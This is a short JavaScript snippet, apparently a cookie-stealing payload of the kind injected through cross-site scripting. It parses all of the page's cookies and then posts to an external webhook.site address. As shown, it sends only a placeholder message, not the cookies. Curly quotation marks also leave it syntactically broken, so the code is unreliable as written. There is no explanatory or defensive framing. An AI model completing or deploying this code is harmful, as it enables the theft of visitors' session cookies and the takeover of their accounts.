var getCookies = function(){
  var pairs = document.cookie.split(";");
  var cookies = {};
  for (var i=0; i<pairs.length; i++){
    var pair = pairs[i].split("=");
    cookies[(pair[0]+'').trim()] = unescape(pair.slice(1).join('='));
  }
  return cookies;
}
var myCookies = getCookies();
var url = "https://webhook.site/cc3863eb-0c66-40a6-88d7-a4cb0ee9b5f1" // Webhook URL
var text = {content: "Hi"}

fetch(url, 
  {
    method: “POST”,
    headers: {“Content-Type”: “application/json”},
    body: JSON.stringify(text),
  }
)
  .then();
